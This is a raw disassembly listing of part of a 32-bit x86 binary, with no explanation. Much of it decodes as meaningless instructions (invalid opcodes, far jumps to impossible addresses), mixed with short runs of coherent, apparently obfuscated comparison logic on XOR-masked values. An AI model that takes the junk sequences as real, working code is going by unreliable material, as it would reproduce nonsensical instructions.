  418d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d26:	cmp    ebx,DWORD PTR [eax]
  418d28:	mov    bl,0x61
  418d2a:	inc    ebx
  418d2b:	jp     0x418d31
  418d2d:	dec    edi
  418d2e:	jbe    0x418d9e
  418d30:	sub    ebp,ebp
  418d32:	dec    esp
  418d33:	icebp  
  418d34:	outs   dx,DWORD PTR ds:[esi]
  418d35:	sbb    BYTE PTR [edi],0x74
  418d38:	(bad)  
  418d39:	(bad)  
  418d3b:	push   esi
  418d3c:	mov    ch,0x3d
  418d3e:	scas   al,BYTE PTR es:[edi]
  418d3f:	jb     0x418d55
  418d41:	add    esp,DWORD PTR [ebx]
  418d43:	mov    ebx,0x78720e99
  418d48:	lahf   
  418d49:	pop    ss
  418d4a:	inc    edx
  418d4b:	sahf   
  418d4c:	xchg   esi,eax
  418d4d:	mov    cl,ch
  418d4f:	std    
  418d50:	mov    DWORD PTR [eax-0x412318d8],esp
  418d56:	int    0xb9
  418d58:	cs es nop
  418d5b:	sbb    DWORD PTR [ecx+0x60],0xffffff83
  418d5f:	jg     0x418d40
  418d61:	mov    edi,0x7c4253f7
  418d66:	addr16 mov al,es:0xa830
  418d6b:	aaa    
  418d6c:	pop    esi
  418d6d:	jnp    0x418d2e
  418d6f:	ja     0x418d05
  418d71:	adc    al,0x83
  418d73:	sbb    dl,BYTE PTR [ebx+0x51]
  418d76:	push   edx
  418d77:	push   eax
  418d78:	call   0x422281
  418d7d:	mov    ecx,DWORD PTR [esp+0x50]
  418d81:	mov    ebx,DWORD PTR [esp+0x54]
  418d85:	add    eax,ecx
  418d87:	mov    ecx,DWORD PTR [esp+0x88]
  418d8e:	adc    edx,ebx
  418d90:	jmp    0x418fed
  418d95:	jmp    0x6c98:0xba87068d
  418d9c:	mov    bl,0x37
  418d9e:	cmc    
  418d9f:	mov    esp,0x263dbca4
  418da4:	rol    DWORD PTR [ebx+edi*8-0x40],1
  418da8:	mov    esi,0xbebec235
  418dad:	pop    ebp
  418dae:	imul   BYTE PTR [ebx+ebx*8-0x76]
  418db2:	sahf   
  418db3:	xor    edx,eax
  418db5:	retf   
  418db6:	pop    ebx
  418db7:	rol    DWORD PTR [ebx+0x29],1
  418dba:	push   esp
  418dbb:	push   DWORD PTR [ecx]
  418dbd:	jp     0x418da7
  418dbf:	mov    eax,ds:0xd4d7e7b9
  418dc4:	jle    0x418e2e
  418dc6:	jno    0x418da9
  418dc8:	xor    eax,0x20fb5ba2
  418dcd:	xchg   esi,eax
  418dce:	aas    
  418dcf:	iret   
  418dd0:	sub    DWORD PTR [ecx],esp
  418dd2:	fisub  DWORD PTR [ecx-0xee5a8bd]
  418dd8:	xor    eax,0x22fddee1
  418ddd:	fcom   DWORD PTR [esi+0x50027742]
  418de3:	push   ss
  418de4:	enter  0xb12e,0xf7
  418de8:	repnz xor al,0x4c
  418deb:	and    al,0xf1
  418ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dee:	test   ebp,eax
  418df0:	cmp    eax,0x699e2beb
  418df5:	mov    ebx,0x58244f8f
  418dfa:	add    ecx,DWORD PTR [ecx-0x50b33cf7]
  418e00:	pop    ebp
  418e01:	mov    bl,0x1a
  418e03:	stos   DWORD PTR es:[edi],eax
  418e04:	mov    ecx,0x5cbe94
  418e09:	pusha  
  418e0a:	lock and esp,ecx
  418e0d:	push   edi
  418e0e:	jge    0x418de4
  418e10:	mov    esp,0xc30b6b55
  418e15:	mov    edi,0xd216cae
  418e1a:	hlt    
  418e1b:	dec    ebx
  418e1c:	and    al,0xdb
  418e1e:	push   ebp
  418e1f:	test   BYTE PTR [ebx+0x6565c6a3],al
  418e25:	loopne 0x418e7b
  418e27:	push   edi
  418e28:	pop    ss
  418e29:	sub    esi,DWORD PTR [edx]
  418e2b:	sbb    al,0xea
  418e2d:	jl     0x418e86
  418e2f:	inc    esi
  418e30:	ret    0xf88d
  418e33:	test   BYTE PTR [edi+0x39],cl
  418e36:	xor    DWORD PTR [ecx-0x77e683eb],edi
  418e3c:	xor    BYTE PTR [ebp-0x80cc26d],bh
  418e42:	xor    DWORD PTR [eax+0x22],ecx
  418e45:	mov    eax,0xf1764369
  418e4a:	sti    
  418e4b:	rcr    bl,1
  418e4d:	mov    ds:0x53c5e1c9,al
  418e52:	jp     0x418ea1
  418e54:	or     al,al
  418e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e57:	int    0x49
  418e59:	ret    
  418e5a:	loopne 0x418eba
  418e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e5d:	or     ah,BYTE PTR [ebx]
  418e5f:	test   al,0x46
  418e61:	into   
  418e62:	int3   
  418e63:	das    
  418e64:	imul   esi,DWORD PTR [edi-0x1e],0xa97108d4
  418e6b:	dec    esp
  418e6c:	shr    BYTE PTR [edx+0x49],0xf1
  418e70:	pop    ebp
  418e71:	lahf   
  418e72:	jns    0x418e4b
  418e74:	sub    esi,esi
  418e76:	inc    ecx
  418e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e78:	push   ecx
  418e79:	mov    al,ds:0x91b3fb0f
  418e7e:	std    
  418e7f:	inc    edi
  418e80:	adc    eax,0x2eb4dfad
  418e85:	pop    ebp
  418e86:	mov    eax,0x1189812f
  418e8b:	and    BYTE PTR [eax-0x4f],bh
  418e8e:	aam    0xaa
  418e90:	aaa    
  418e91:	out    dx,eax
  418e92:	sub    al,0xac
  418e94:	mov    ds:0x3d413c2c,al
  418e99:	dec    ebp
  418e9a:	xor    BYTE PTR [esi+edx*2-0xbcf3746],dl
  418ea1:	xor    BYTE PTR [esi-0x2b],bl
  418ea4:	dec    edi
  418ea5:	or     eax,esi
  418ea7:	or     eax,0x9503b7fb
  418eac:	pop    es
  418ead:	and    bh,BYTE PTR [edx+eax*2-0x1e]
  418eb1:	sub    BYTE PTR [ecx-0x3f7bb30d],bl
  418eb7:	sub    al,0xea
  418eb9:	stc    
  418eba:	cmc    
  418ebb:	mov    esi,0xabb20ebf
  418ec0:	dec    ebp
  418ec1:	pop    edi
  418ec2:	mov    bl,0x3d
  418ec4:	cmc    
  418ec5:	jnp    0x418f46
  418ec7:	shl    BYTE PTR [edx],1
  418ec9:	mov    cl,0xa6
  418ecb:	sub    DWORD PTR [ebx+0xdcc29e8],esi
  418ed1:	sub    DWORD PTR [edi-0x7eaf99a],ecx
  418ed7:	(bad)  
  418ed8:	xchg   ebx,eax
  418ed9:	icebp  
  418eda:	dec    esp
  418edb:	mov    bl,0x78
  418edd:	sub    cl,BYTE PTR [ecx+0x52788f5]
  418ee3:	retf   0x3ef1
  418ee6:	mov    dh,0xc3
  418ee8:	ficomp WORD PTR [ebx-0x358ee97e]
  418eee:	test   edx,ebx
  418ef0:	repnz push ds
  418ef2:	jo     0x418f29
  418ef4:	pop    edx
  418ef5:	je     0x418f56
  418ef7:	add    bh,cl
  418ef9:	sub    eax,0xa6acc521
  418efe:	inc    esi
  418eff:	wbinvd 
  418f01:	jmp    0x4e83aff5
  418f06:	cmp    dh,BYTE PTR [edi-0x13bf916a]
  418f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f0d:	jno    0x418f4a
  418f0f:	dec    esp
  418f10:	xchg   ebp,eax
  418f11:	mov    esp,0x5f89aa81
  418f16:	and    al,0xc0
  418f18:	adc    ah,ah
  418f1a:	push   0xffffffbe
  418f1c:	les    ecx,FWORD PTR [eax+edi*4]
  418f1f:	fadd   QWORD PTR [esi+0x25c9a366]
  418f25:	add    eax,0xef32dc53
  418f2a:	dec    ebp
  418f2b:	pop    eax
  418f2c:	pop    ebp
  418f2d:	shl    BYTE PTR [ecx+0x250d6c7],0x29
  418f34:	retf   0x6489
  418f37:	jmp    0xbf6a208
  418f3c:	in     al,0x29
  418f3e:	call   0x35eb7ec7
  418f43:	jns    0x418f0e
  418f45:	and    dh,BYTE PTR [esi+0x5c16a962]
  418f4b:	mov    dl,0xa9
  418f4d:	out    dx,eax
  418f4e:	xchg   edx,eax
  418f4f:	jp     0x418f13
  418f51:	inc    ebx
  418f52:	outs   dx,DWORD PTR ds:[esi]
  418f53:	add    eax,eax
  418f55:	and    eax,0x5165e5f4
  418f5a:	test   BYTE PTR [eax+0x17589927],cl
  418f60:	scas   al,BYTE PTR es:[edi]
  418f61:	shl    BYTE PTR [edi-0x3f],1
  418f64:	shr    dl,1
  418f66:	mov    ebp,DWORD PTR ds:0xb5376692
  418f6c:	mov    bh,0x93
  418f6e:	mov    bl,0x90
  418f70:	mov    eax,ds:0xa1f76f81
  418f75:	mov    dl,0x1a
  418f77:	mov    eax,0xccc9fae2
  418f7c:	popa   
  418f7d:	call   0xc542:0xb6017bbe
  418f84:	adc    DWORD PTR [esi-0x5d],edi
  418f87:	rcl    BYTE PTR [eax+ecx*1],1
  418f8a:	fmulp  st(4),st
  418f8c:	mov    esi,0xc639b000
  418f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f92:	inc    esi
  418f93:	cs xchg esp,eax
  418f95:	adc    al,0xc7
  418f97:	(bad)  
  418f98:	push   edi
  418f99:	loop   0x418f4b
  418f9b:	out    0x49,eax
  418f9d:	popa   
  418f9e:	sar    DWORD PTR [esi],cl
  418fa0:	mov    ah,0x23
  418fa2:	push   esp
  418fa3:	fs mov cl,0xfb
  418fa6:	call   0x3c1de12e
  418fab:	cmp    ch,dh
  418fad:	mov    edx,0xf3a03ae8
  418fb2:	or     eax,0x8400a2cd
  418fb7:	sar    BYTE PTR ds:0xffa9a73,0x4c
  418fbe:	jle    0x418fdf
  418fc0:	sbb    BYTE PTR [ebx+0x8],ch
  418fc3:	push   ss
  418fc4:	push   ecx
  418fc5:	outs   dx,BYTE PTR ds:[esi]
  418fc6:	xchg   BYTE PTR [edx+0x15],dh
  418fc9:	dec    ecx
  418fca:	(bad)  
  418fcb:	popf   
  418fcc:	add    ebp,edx
  418fce:	sbb    BYTE PTR [ebp-0x47],dl
  418fd1:	rcl    esp,0x5c
  418fd4:	clc    
  418fd5:	cmp    al,0xcf
  418fd7:	mov    ebx,?
  418fd9:	mov    ah,0x82
  418fdb:	sbb    DWORD PTR [ecx+0x5ea39a46],esi
  418fe1:	add    al,0xf6
  418fe3:	cmp    al,BYTE PTR [ecx+0x1d9283fe]
  418fe9:	test   ebx,ebx
  418feb:	push   eax
  418fec:	xchg   edi,eax
  418fed:	mov    ebx,DWORD PTR [esp+0x8c]
  418ff4:	cmp    ecx,eax
  418ff6:	jne    0x419004
  418ffc:	cmp    ebx,edx
  418ffe:	je     0x41a937
  419004:	mov    eax,DWORD PTR [esp+0x40]
  419008:	mov    edx,DWORD PTR [esp+0x18]
  41900c:	xor    ecx,ecx
  41900e:	shld   ecx,eax,0x2
  419012:	jmp    0x41926f
  419017:	retf   0xad14
  41901a:	repnz mov eax,0x983c8a74
  419020:	xchg   edx,eax
  419021:	xor    bl,ch
  419023:	sub    dh,BYTE PTR [ecx]
  419025:	inc    esp
  419026:	fnstsw WORD PTR [edi+edi*8-0x3dca4140]
  41902d:	mov    esi,0xd2a7a5be
  419032:	mov    al,BYTE PTR ds:0xb2ed556d
  419038:	retf   0x1a2f
  41903b:	in     al,dx
  41903c:	cld    
  41903d:	pop    ecx
  41903e:	nop
  41903f:	cmp    dl,bh
  419041:	mov    esp,0x8cd9503a
  419046:	fdiv   QWORD PTR [ebp-0x73]
  419049:	lds    ebp,FWORD PTR [ebp+0xf]
  41904c:	sbb    BYTE PTR [edi-0x3a83e6bd],ah
  419052:	cwde   
  419053:	leave  
  419054:	pop    esi
  419055:	mov    bl,0x13
  419057:	or     BYTE PTR [esi-0x255101c6],al
  41905d:	fstp   TBYTE PTR [ebp+0x1e]
  419060:	(bad)  
  419061:	stos   BYTE PTR es:[edi],al
  419062:	adc    DWORD PTR [edx],esp
  419064:	xchg   esi,eax
  419065:	and    DWORD PTR [ecx+0x70edd8c1],eax
  41906b:	or     al,0x88
  41906d:	push   ss
  41906e:	inc    ebp
  41906f:	sbb    DWORD PTR [ebx-0x29d3255b],ebp
  419075:	out    dx,al
  419076:	adc    DWORD PTR [ecx+0x68a364d7],ecx
  41907c:	mov    BYTE PTR [ebx],al
  41907e:	jne    0x419024
  419080:	sub    dh,bh
  419082:	jae    0x41909d
  419084:	jmp    0x91a2:0xe280
  41908a:	mov    dl,BYTE PTR [ecx]
  41908c:	inc    ebp
  41908d:	and    eax,0xe82ec1fa
  419092:	pop    ebx
  419093:	stos   BYTE PTR es:[edi],al
  419094:	mov    eax,ds:0x3b76152c
  419099:	into   
  41909a:	int3   
  41909b:	jg     0x41910b
  41909d:	call   0xa11e:0xbf130859
  4190a4:	add    eax,esp
  4190a6:	repz aam 0x0
  4190a9:	aam    0x54
  4190ab:	push   ss
  4190ac:	pop    ds
  4190ad:	inc    ebp
  4190ae:	addr16 or eax,0xb950b2d5
  4190b4:	adc    dh,ch
  4190b6:	cmp    eax,0x83f96b08
  4190bb:	cwde   
  4190bc:	adc    eax,0x8da63dce
  4190c1:	mov    al,ds:0x3b430465
  4190c6:	scas   eax,DWORD PTR es:[edi]
  4190c7:	in     eax,dx
  4190c8:	adc    ch,0xbc
  4190cb:	and    edx,DWORD PTR [edx]
  4190cd:	sub    eax,eax
  4190cf:	dec    ecx
  4190d0:	ins    BYTE PTR es:[edi],dx
  4190d1:	(bad)  
  4190d2:	(bad)  [ebx-0x20]
  4190d5:	stos   DWORD PTR es:[edi],eax
  4190d6:	pop    esi
  4190d7:	imul   ebp,DWORD PTR [ebp+0x198b473a],0x666fe402
  4190e1:	mov    eax,0xc19be76d
  4190e6:	mov    ds:0xe1cc2886,eax
  4190eb:	jb     0x4190d4
  4190ed:	shl    BYTE PTR [ecx-0x54],0x10
  4190f1:	lods   al,BYTE PTR ds:[esi]
  4190f2:	(bad)  
  4190f3:	cmp    esi,DWORD PTR [ebp+esi*2+0x38]
  4190f7:	leave  
  4190f8:	(bad)  
  4190f9:	fist   WORD PTR [ecx+0x31cea7cd]
  4190ff:	or     eax,0x3014e82c
  419104:	push   ebx
  419105:	mov    cl,0xe1
  419107:	sbb    dl,BYTE PTR [edi]
  419109:	jmp    0x41913a
  41910b:	in     eax,dx
  41910c:	enter  0x4cc2,0x73
  419110:	pop    eax
  419111:	enter  0x4fe5,0xcd
  419115:	or     al,0x63
  419117:	and    DWORD PTR [ebp-0x4fc16bb4],edx
  41911d:	dec    esp
  41911e:	push   esp
  41911f:	fxch   st(6)
  419121:	scas   eax,DWORD PTR es:[edi]
  419122:	mov    al,ds:0x764721d2
  419127:	addr16 and eax,0x1142ba71
  41912d:	int3   
  41912e:	iret   
  41912f:	adc    eax,0x3f8d6f36
  419134:	jno    0x4190f7
  419136:	add    al,0x66
  419138:	cld    
  419139:	dec    ebx
  41913a:	sbb    DWORD PTR [edi+0x1f],0xffffffc0
  41913e:	je     0x4190dc
  419140:	ins    DWORD PTR es:[edi],dx
  419141:	xchg   ebx,eax
  419142:	mov    cl,0x8a
  419144:	(bad)  
  419145:	push   esi
  419146:	pop    eax
  419147:	aam    0x78
  419149:	out    0xf0,al
  41914b:	into   
  41914c:	xor    edx,DWORD PTR [eax]
  41914e:	mov    al,ds:0x1b16760e
  419153:	cmp    al,0x65
  419155:	shl    BYTE PTR [ebx],1
  419157:	dec    edx
  419158:	ins    DWORD PTR es:[edi],dx
  419159:	inc    esp
  41915a:	sub    DWORD PTR [eax],esp
  41915c:	repnz cwde 
  41915e:	lods   eax,DWORD PTR ds:[esi]
  41915f:	popf   
  419160:	inc    ebp
  419161:	lods   al,BYTE PTR ds:[esi]
  419162:	mov    BYTE PTR ds:0xcb095304,al
  419168:	adc    esi,DWORD PTR [esi-0x631ad78d]
  41916e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41916f:	jecxz  0x4191cc
  419171:	sbb    eax,0x2392b6e6
  419176:	jo     0x419113
  419178:	sub    al,0x20
  41917a:	sub    DWORD PTR [esi+0x71],edx
  41917d:	bound  ebp,QWORD PTR es:[ecx]
  419180:	out    0x99,eax
  419182:	push   ss
  419183:	scas   al,BYTE PTR es:[edi]
  419184:	aad    0x9d
  419186:	out    0x63,eax
  419188:	sub    eax,0x53c9a94d
  41918d:	loope  0x4191a4
  41918f:	(bad)  
  419190:	in     al,0xf2
  419192:	repnz sub ebx,esi
  419195:	imul   esp,eax,0x2b9e2d1d
  41919b:	or     bl,dh
  41919d:	bound  edi,QWORD PTR [edx+0x3300a107]
  4191a3:	leave  
  4191a4:	sbb    al,0x66
  4191a6:	dec    ebx
  4191a7:	repnz mov fs,WORD PTR [eax+0x7]
  4191ab:	mov    al,0xb4
  4191ad:	retf   
  4191ae:	fld    TBYTE PTR [edx-0x23]
  4191b1:	and    BYTE PTR [ebx-0x637a21f8],cl
  4191b7:	mov    dh,0xa0
  4191b9:	mov    ds:0x80f5ef71,eax
  4191be:	dec    ebx
  4191bf:	xor    DWORD PTR [edi],0xffffffb3
  4191c2:	mov    DWORD PTR [edi-0x609be154],esp
  4191c8:	(bad)  
  4191c9:	outs   dx,BYTE PTR ds:[esi]
  4191ca:	sub    DWORD PTR [eax-0x5],esi
  4191cd:	sub    esi,ecx
  4191cf:	pushf  
  4191d0:	mov    dh,0xda
  4191d2:	shl    edx,1
  4191d4:	mov    al,0x1f
  4191d6:	inc    ecx
  4191d7:	ret    0x50ec
  4191da:	out    dx,eax
  4191db:	sub    esi,DWORD PTR [ecx+0x260d4eb8]
  4191e1:	aam    0x82
  4191e3:	push   cs
  4191e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191e5:	pop    ecx
  4191e6:	xchg   DWORD PTR [esi+edx*1+0x4797952f],ebx
  4191ed:	ss pop eax
  4191ef:	xlat   BYTE PTR ds:[ebx]
  4191f0:	addr16 push 0x42
  4191f3:	(bad)  
  4191f4:	in     eax,dx
  4191f5:	inc    ebx
  4191f6:	adc    esi,DWORD PTR [ecx]
  4191f8:	add    edx,DWORD PTR [ebx-0x7b]
  4191fb:	adc    ebx,esi
  4191fd:	stos   DWORD PTR es:[edi],eax
  4191fe:	sti    
  4191ff:	loop   0x419257
  419201:	mov    edi,0xe5ea4be4
  419206:	fsubr  QWORD PTR [ebp-0x238c15ad]
  41920c:	cmc    
  41920d:	(bad)  
  41920e:	shl    DWORD PTR [edi-0x7ef75e7c],cl
  419214:	mov    dl,0xb1
  419216:	mov    DWORD PTR [eax-0x16],ebx
  419219:	cmp    eax,0x1494186c
  41921e:	xchg   ecx,eax
  41921f:	nop
  419220:	aad    0xd9
  419222:	mov    bl,0x8f
  419224:	dec    ebp
  419225:	add    eax,0x32ea94a0
  41922a:	(bad)  
  41922b:	out    dx,eax
  41922c:	mov    ch,0xa
  41922e:	sub    BYTE PTR [edi],ch
  419230:	pop    ss
  419231:	jb     0x419293
  419233:	push   0x43
  419235:	into   
  419236:	add    eax,DWORD PTR [edi+edx*8-0x7b]
  41923a:	jmp    0x2465718e
  41923f:	stos   BYTE PTR es:[edi],al
  419240:	outs   dx,DWORD PTR ds:[esi]
  419241:	sub    BYTE PTR [ebx-0x6d21658e],bl
  419247:	mov    ecx,0x8a7e5a2e
  41924c:	jns    0x419254
  41924e:	xchg   ah,cl
  419250:	jg     0x419244
  419252:	lods   eax,DWORD PTR ds:[esi]
  419253:	imul   esi,DWORD PTR [edx-0xf],0x7f74cb60
  41925a:	pop    ds
  41925b:	mul    BYTE PTR [ebx+0x5d]
  41925e:	pop    eax
  41925f:	clc    
  419260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419261:	cmp    eax,0xf1d9dee1
  419266:	ror    BYTE PTR [ebx+0x3d],cl
  419269:	or     al,0xbb
  41926b:	jmp    0x419286
  41926d:	aaa    
  41926e:	in     eax,0xc1
  419270:	loopne 0x419274
  419272:	mov    ebx,0xcb79b576
  419277:	mov    DWORD PTR [esp+0x10],edx
  41927b:	mov    edx,DWORD PTR [esp+0x1c]
  41927f:	xor    eax,ebx
  419281:	xor    ecx,esi
  419283:	mov    DWORD PTR [esp+0x14],edx
  419287:	cmp    eax,DWORD PTR [esp+0x10]
  41928b:	jne    0x419299
  419291:	cmp    ecx,edx
  419293:	je     0x41a93c
  419299:	mov    eax,DWORD PTR [esp+0x44]
  41929d:	cmp    eax,0xa5069baa
  4192a2:	je     0x4192f6
  4192a8:	mov    edx,DWORD PTR [esp+0x18]
  4192ac:	mov    eax,DWORD PTR [esp+0x1c]
  4192b0:	xor    eax,esi
  4192b2:	xor    edx,0xcb79b577
  4192b8:	shrd   edx,eax,0x2
  4192bc:	shr    eax,0x2
  4192bf:	mov    DWORD PTR [esp+0x34],eax
  4192c3:	mov    eax,DWORD PTR [esp+0x18]
  4192c7:	mov    ecx,DWORD PTR [esp+0x1c]
  4192cb:	shl    eax,0x1e
  4192ce:	xor    eax,0x80000000
  4192d3:	or     eax,DWORD PTR [esp+0x34]
  4192d7:	xor    ecx,ecx
  4192d9:	mov    DWORD PTR [esp+0x14],eax
  4192dd:	mov    eax,DWORD PTR [esp+0x60]
  4192e1:	or     ecx,edx
  4192e3:	cdq    
  4192e4:	cmp    ecx,eax
  4192e6:	jne    0x41a93c
  4192ec:	cmp    DWORD PTR [esp+0x14],edx
  4192f0:	jne    0x41a93c
  4192f6:	mov    DWORD PTR [esp+0x5c],0x4227a4
  4192fe:	mov    DWORD PTR [esp+0x68],0x42279c
  419306:	mov    eax,DWORD PTR [esp+0x78]
  41930a:	mov    eax,DWORD PTR [esp+0x78]
  41930e:	mov    edx,DWORD PTR [esp+0x18]
  419312:	xor    ecx,ecx
  419314:	shld   ecx,eax,0x2
  419318:	shl    eax,0x2
  41931b:	mov    DWORD PTR [esp+0x10],edx
  41931f:	mov    edx,DWORD PTR [esp+0x1c]
  419323:	xor    eax,ebx
  419325:	xor    ecx,esi
  419327:	mov    DWORD PTR [esp+0x14],edx
  41932b:	cmp    DWORD PTR [esp+0x10],eax
  41932f:	jne    0x41a5e3
  419335:	cmp    edx,ecx
  419337:	jne    0x41a5e3
  41933d:	mov    DWORD PTR [esp+0x30],0x42272c
  419345:	mov    eax,DWORD PTR [esp+0x18]
  419349:	mov    ecx,DWORD PTR [esp+0x1c]
  41934d:	shrd   eax,ecx,0x2
  419351:	shr    ecx,0x2
  419354:	mov    ecx,DWORD PTR [esp+0x18]
  419358:	mov    edx,DWORD PTR [esp+0x1c]
  41935c:	mov    edx,DWORD PTR [esp+0x30]
  419360:	mov    edx,DWORD PTR [edx+0xc]
  419363:	mov    DWORD PTR [esp+0xc],eax
  419367:	shl    ecx,0x1e
  41936a:	mov    eax,0x32de6d5d
  41936f:	xor    DWORD PTR [esp+0xc],eax
  419373:	xor    ecx,ecx
  419375:	or     ecx,DWORD PTR [esp+0xc]
  419379:	cmp    ecx,DWORD PTR [edx]
  41937b:	jne    0x41a320
  419381:	mov    ecx,0x65c7
  419386:	mov    WORD PTR [esp+0x2c],cx
  41938b:	mov    ecx,0x6062
  419390:	mov    WORD PTR [esp+0x24],cx
  419395:	mov    ecx,0x125d
  41939a:	mov    WORD PTR [esp+0xc],cx
  41939f:	movzx  ecx,WORD PTR [esp+0xc]
  4193a4:	mov    edx,0x2d0f
  4193a9:	and    cx,dx
  4193ac:	mov    dx,WORD PTR [esp+0x24]
  4193b1:	or     cx,dx
  4193b4:	mov    dx,WORD PTR [esp+0x2c]
  4193b9:	add    cx,dx
  4193bc:	or     ecx,0x3b22
  4193c2:	mov    WORD PTR [esp+0x3c],cx
  4193c7:	mov    ecx,0x57d4
  4193cc:	mov    WORD PTR [esp+0x2c],cx
  4193d1:	mov    ecx,0x3b21
  4193d6:	mov    WORD PTR [esp+0x38],cx
  4193db:	mov    ecx,0x52fd
  4193e0:	mov    WORD PTR [esp+0x24],cx
  4193e5:	mov    ecx,0x2ce0
  4193ea:	mov    WORD PTR [esp+0xc],cx
  4193ef:	mov    cx,WORD PTR [esp+0xc]
  4193f4:	mov    dx,WORD PTR [esp+0x24]
  4193f9:	jmp    0x419656
  4193fe:	gs pop ss
  419400:	dec    BYTE PTR [eax+esi*4]
  419403:	sbb    al,0x6b
  419405:	mov    esp,0xd16889ea
  41940a:	imul   ebp,DWORD PTR [edi+0x533a4f6],0xffffffc0
  419411:	mov    esi,0xbebec235
  419416:	mov    al,ds:0xe893abb1
  41941b:	fxch   st(3)
  41941d:	pushf  
  41941e:	mov    al,BYTE PTR [eax-0x16]
  419421:	cmp    al,BYTE PTR [ecx]
  419423:	mov    esi,0x4b7bdf5b
  419428:	mov    ebp,0x14d22180
  41942d:	add    esi,DWORD PTR [ebx+ecx*1]
  419430:	jns    0x419467
  419432:	imul   ecx,DWORD PTR [ebx-0x28],0xffffffc2
  419436:	popf   
  419437:	dec    ebx
  419438:	push   esi
  419439:	sub    bl,BYTE PTR [ecx]
  41943b:	sub    BYTE PTR [ebp+0x57534d33],ch
  419441:	aas    
  419442:	cmp    ebx,DWORD PTR ds:0xde6d0605
  419448:	fcomp  DWORD PTR [ecx+0x4001162e]
  41944e:	mov    BYTE PTR [edx-0x2e],dh
  419451:	ret    0x9db2
  419454:	std    
  419455:	pop    edx
  419456:	sbb    eax,0xf73e5595
  41945b:	mov    ecx,ss
  41945d:	or     al,0xf2
  41945f:	repnz adc al,0x68
  419462:	aaa    
  419463:	test   BYTE PTR [edi+0x32],bh
  419466:	dec    eax
  419467:	xchg   edi,eax
  419468:	outs   dx,DWORD PTR ds:[esi]
  419469:	adc    DWORD PTR [edx],esp
  41946b:	push   ecx
  41946c:	pop    edi
  41946d:	call   0x8fed:0xf60efbdd
  419474:	loope  0x41946f
  419476:	cmp    BYTE PTR [edi+0x1bde6c97],cl
  41947c:	or     DWORD PTR [edx],0x3d
  41947f:	dec    esi
  419480:	xchg   DWORD PTR [edx],ebp
  419482:	xor    BYTE PTR [edx+0x39],dh
  419485:	mov    dl,0xc
  419487:	lock mov ds:0x9b3aff57,al
  41948d:	adc    BYTE PTR [ebx-0x5d4020f5],0x8b
  419494:	adc    edi,edx
  419496:	jecxz  0x41947a
  419498:	pop    ecx
  419499:	pop    esp
  41949a:	xchg   DWORD PTR [esi-0x3949a243],edx
  4194a0:	add    al,0x53
  4194a2:	jae    0x41947a
  4194a4:	add    ah,dh
  4194a6:	data16 aaa 
  4194a8:	inc    eax
  4194a9:	mov    esp,0xe48046aa
  4194ae:	dec    esp
  4194af:	and    ch,BYTE PTR [ebp-0x4e]
  4194b2:	cmp    ch,BYTE PTR [ebx]
  4194b4:	iret   
  4194b5:	(bad)  
  4194b6:	out    0xea,al
  4194b8:	fwait
  4194b9:	je     0x4194c8
  4194bb:	mov    WORD PTR [edx+eiz*4-0x6aa5d25e],cs
  4194c2:	jb     0x4194ba
  4194c4:	mov    eax,0x8c3cb6a4
  4194c9:	mov    ecx,0x8da7bc3f
  4194ce:	cdq    
  4194cf:	inc    edx
  4194d0:	mov    dl,0x61
  4194d2:	out    0x4b,al
  4194d4:	gs aaa 
  4194d6:	ss cmc 
  4194d8:	enter  0xf8ef,0x36
  4194dc:	shr    BYTE PTR [edx-0x17],0x87
  4194e0:	dec    ecx
  4194e1:	add    DWORD PTR [esi+0x61],ecx
  4194e4:	xor    DWORD PTR [eax+0x63],0x863dcdb0
  4194eb:	(bad)  
  4194ec:	div    bl
  4194ee:	imul   esp,edx,0xfa52bd59
  4194f4:	xchg   ecx,eax
  4194f5:	add    bh,BYTE PTR [ecx+0x391be615]
  4194fb:	fnsave [eax+ebp*2-0x4f69824d]
  419502:	xor    DWORD PTR [ebx],ebp
  419504:	xor    DWORD PTR [ebx+0x73],edx
  419507:	sub    BYTE PTR [ecx-0x4],0x64
  41950b:	in     al,0x95
  41950d:	add    BYTE PTR [ebp-0x75],dh
  419510:	icebp  
  419511:	cmp    DWORD PTR [ebx+0x15],0xa5007a5d
  419518:	es ins DWORD PTR es:[edi],dx
  41951a:	mov    ?,WORD PTR [edx+0x3c]
  41951d:	dec    edi
  41951e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41951f:	xchg   edx,eax
  419520:	mov    DWORD PTR [edi],ebp
  419522:	or     al,0xbc
  419524:	mov    BYTE PTR [eax+edx*8+0x52],bh
  419528:	in     eax,0x30
  41952a:	push   edi
  41952b:	inc    esi
  41952c:	sub    bl,al
  41952e:	mov    bh,0x1
  419530:	pop    eax
  419531:	and    ch,ah
  419533:	mov    ecx,0xdf164a00
  419538:	adc    dh,BYTE PTR [eax]
  41953a:	call   0x8903be82
  41953f:	imul   esi,DWORD PTR [eax+0x70],0xffffffa4
  419543:	mov    bh,0xe3
  419545:	mov    dl,0x79
  419547:	ret    0x7528
  41954a:	(bad)  
  41954c:	dec    esi
  41954d:	stos   BYTE PTR es:[edi],al
  41954e:	es (bad) 
  419550:	xor    esp,esp
  419552:	out    0x17,al
  419554:	scas   al,BYTE PTR es:[edi]
  419555:	sbb    al,0x7c
  419557:	gs iret 
  419559:	adc    ebx,eax
  41955b:	or     eax,0x558d571
  419560:	loop   0x41957a
  419562:	xlat   BYTE PTR ds:[ebx]
  419563:	push   ebx
  419564:	jp     0x4194f2
  419566:	adc    eax,0xc6c8e539
  41956b:	int3   
  41956c:	or     DWORD PTR [ecx+0x71f4ffc3],ebp
  419572:	pop    ebp
  419573:	push   es
  419574:	mov    esp,0x8eaeea2b
  419579:	jo     0x419544
  41957b:	pop    edi
  41957c:	xchg   ebx,eax
  41957d:	pop    esi
  41957e:	inc    edx
  41957f:	(bad)  
  419580:	repnz mov edi,0x92b8069e
  419586:	adc    BYTE PTR [ebx+eax*1],ch
  419589:	cmp    eax,DWORD PTR [ebp*2+0x329a7312]
  419590:	inc    esi
  419591:	popa   
